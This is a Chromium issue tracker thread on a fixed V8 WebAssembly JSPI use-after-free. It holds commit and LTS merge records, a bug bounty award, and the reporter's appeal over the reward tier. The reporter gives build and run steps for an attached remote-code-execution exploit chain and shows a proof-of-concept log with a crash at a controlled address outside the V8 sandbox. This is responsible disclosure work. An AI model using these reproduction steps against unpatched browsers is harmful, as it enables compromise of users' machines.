Hash: [bbc81df806966880c4eb606a65e106ce9cd722fd](https://chromiumdash.appspot.com/commit/bbc81df806966880c4eb606a65e106ce9cd722fd)  

Date: Wed Apr 15 10:08:44 2026


---

### pe...@google.com (2026-04-16)

LTS Milestone M144

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### dx...@google.com (2026-04-16)

Project: v8/v8  

Branch:  refs/branch-heads/14.7  

Author:  Thibaud Michaud [thibaudm@chromium.org](mailto:thibaudm@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7768429>

[M147] [wasm][jspi] Clear suspender EPT entry on unwind

---


Expand for full commit details
```
     
    Original change's description: 
    > [wasm][jspi] Clear suspender EPT entry on unwind 
    > 
    > Similar to: 
    > 
    > "7607183: [jspi] Clear EPT entry on stack return" 
    > https://chromium-review.git.corp.google.com/c/v8/v8/+/7607183 
    > 
    > But the external pointer also needs to be cleared when we exit the 
    > suspender because of a thrown exception. 
    > 
    > R=jkummerow@chromium.org 
    > 
    > Fixed: 501147587 
    > Change-Id: Ib5e3a1d9a94831c4fb09a0b7553fb0c0d3aa0f0a 
    > Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7762030 
    > Commit-Queue: Thibaud Michaud <thibaudm@chromium.org> 
    > Reviewed-by: Jakob Kummerow <jkummerow@chromium.org> 
    > Cr-Commit-Position: refs/heads/main@{#106503} 
     
    (cherry picked from commit 13c7629466fa3081df011d95cf35a20ed4b7fc63) 
     
    Bug: 503208126,501147587 
    Change-Id: Ib5e3a1d9a94831c4fb09a0b7553fb0c0d3aa0f0a 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7768429 
    Auto-Submit: chrome-cherry-picker@chops-service-accounts.iam.gserviceaccount.com <chrome-cherry-picker@chops-service-accounts.iam.gserviceaccount.com> 
    Bot-Commit: rubber-stamper@appspot.gserviceaccount.com <rubber-stamper@appspot.gserviceaccount.com> 
    Commit-Queue: rubber-stamper@appspot.gserviceaccount.com <rubber-stamper@appspot.gserviceaccount.com> 
    Cr-Commit-Position: refs/branch-heads/14.7@{#38} 
    Cr-Branched-From: 723547b98d2e75cb85556ab85479688c9fbe2f1e-refs/heads/14.7.173@{#1} 
    Cr-Branched-From: 3fc49d4c4cd9e6202fe21f5925899292ffadb20a-refs/heads/main@{#105661}

```

---

Files:

- M `src/execution/isolate.cc`
- A `test/mjsunit/sandbox/regress-501147587.js`

---

Hash: [d1402a91fbe73bafe5e654399b71ff3fa64f051f](https://chromiumdash.appspot.com/commit/d1402a91fbe73bafe5e654399b71ff3fa64f051f)  

Date: Wed Apr 15 10:08:44 2026


---

### qq...@calif.io (2026-04-18)

Thanks for the fix!

---

For VRP panel, here is the RCE exploit for a standalone d8 build, chaining with [crbug/500880819](https://crbug.com/500880819) (reported by me), to demonstrate potential impact of this vulnerability.

# Prepare d8 build

```
# 1. Fetch v8 and checkout the exact commit
fetch v8 && cd v8
git checkout 31b353261e4
gclient sync -D

# 2. Configure a release build with symbols + test features
gn gen out/REL_NOMC --args='
  dcheck_always_on = false
  is_clang = true
  is_component_build = false
  is_debug = false
  symbol_level = 1
  target_cpu = "x64"
  v8_enable_test_features = true
  v8_enable_memory_corruption_api = false
'

# 3. Build d8
autoninja -C out/REL_NOMC d8

```
# Prepare the exploit

Download the attachments and put them into poc/ folder inside v8 tree.

```
# Generate symbols
./poc/derive-constants.sh ./out/REL_NOMC/d8

```
# Run it

You may need to retry a few times

```
./out/REL_NOMC/d8 --allow-natives-syntax --expose-gc poc/chain-v3.js

```

Check `ls -lah /tmp/PWNED_v3` to see if the exploit succeeded.

---

Disclaimer: The exploit is vibe-coded but also tested.

### sp...@google.com (2026-04-22)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $5000.00 for this report.

Rationale for this decision:
Baseline. Renderer RCE / memory corruption in a sandboxed process


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### qq...@calif.io (2026-04-24)

Hello, thank you for the fix & reward!

---

We don't care much about the money amount in this case. However, shouldn't this consider for [V8 Sandbox Bypass Rewards](https://bughunters.google.com/about/rules/chrome-friends/chrome-vulnerability-reward-program-rules#v8-sandbox-bypass-rewards) instead of "Baseline. Renderer RCE / memory corruption in a sandboxed process"?

We demonstrated RCE so shouldn't this be at least Controlled write outside the V8 sandbox. In this case, we don't even need to compile the memory corruption API in.

PoC in [#5](https://issues.chromium.org/issues/501147587#comment5) should also show crash with controlled address 0x133700001337
:

```
❯ ./out/x64.release-sbx/d8 --sandbox-testing --allow-natives-syntax --expose-gc poc.js
Sandbox testing mode is enabled. Only sandbox violations will be reported, all other crashes will be ignored.
Sandbox bounds: [0x21ec00000000,0x22ec00000000)
[*] suspender TPT handle: 0x41b600
[*] resolving → terminate → cross-stack unwind
[*] post-term: TPT handle still 0x41b600
[*] gc(last-resort) → ReleaseFinishedStacks → operator delete(184)
[*] new WebAssembly.Module(184) → operator new[](184) → same slot
[*] resuming — expect SEGV @ pc=0x133700001337 (out-of-sandbox)

## V8 sandbox violation detected!

Received signal 11 SEGV_MAPERR 133700001337

```

With the following build:

```
❯ cat ./out/x64.release-sbx/args.gn
is_debug = false
target_cpu = "x64"
v8_enable_sandbox = true
v8_enable_memory_corruption_api = true
v8_enable_backtrace = true
v8_enable_disassembler = true
v8_enable_object_print = true
dcheck_always_on = false

```

---

Sorry this is my first time submitting v8 bug so I don't know what are the current requirements for this. I did take inspiration from older submission (e.g. <https://issues.chromium.org/issues/452605803>)

### pe...@google.com (2026-05-11)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)

### qk...@google.com (2026-05-11)

1. <https://chromium-review.git.corp.google.com/c/v8/v8/+/7832004>
2. Low - There was no conflict.
3. 147 and 148
4. Yes, the bug has existed since M139.

### dx...@google.com (2026-05-15)

Project: v8/v8  

Branch:  refs/branch-heads/14.4  

Author:  Thibaud Michaud [thibaudm@chromium.org](mailto:thibaudm@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7832004>

[M144-LTS][wasm][jspi] Clear suspender EPT entry on unwind

---


Expand for full commit details
```
     
    Similar to: 
     
    "7607183: [jspi] Clear EPT entry on stack return" 
    https://chromium-review.git.corp.google.com/c/v8/v8/+/7607183 
     
    But the external pointer also needs to be cleared when we exit the 
    suspender because of a thrown exception. 
     
    R=jkummerow@chromium.org 
     
    (cherry picked from commit 13c7629466fa3081df011d95cf35a20ed4b7fc63) 
     
    Fixed: 501147587 
    Change-Id: Ib5e3a1d9a94831c4fb09a0b7553fb0c0d3aa0f0a 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7762030 
    Commit-Queue: Thibaud Michaud <thibaudm@chromium.org> 
    Reviewed-by: Jakob Kummerow <jkummerow@chromium.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#106503} 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7832004 
    Reviewed-by: Thibaud Michaud <thibaudm@chromium.org> 
    Commit-Queue: Jakob Kummerow <jkummerow@chromium.org> 
    Cr-Commit-Position: refs/branch-heads/14.4@{#82} 
    Cr-Branched-From: 80acc26727d5a34e77dabeebe7c9213ec1bd4768-refs/heads/14.4.258@{#1} 
    Cr-Branched-From: ce7e597e90f6df3fa4b6df224bc613b80c635450-refs/heads/main@{#104020}

```

---

Files:

- M `src/execution/isolate.cc`
- A `test/mjsunit/sandbox/regress-501147587.js`

---

Hash: [6b2cb01c4ff69bc6ecd54e353314309a6eb9b6dc](https://chromiumdash.appspot.com/commit/6b2cb01c4ff69bc6ecd54e353314309a6eb9b6dc)  

Date: Wed Apr 15 10:08:44 2026


---

### ch...@google.com (2026-07-23)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/501147587)*
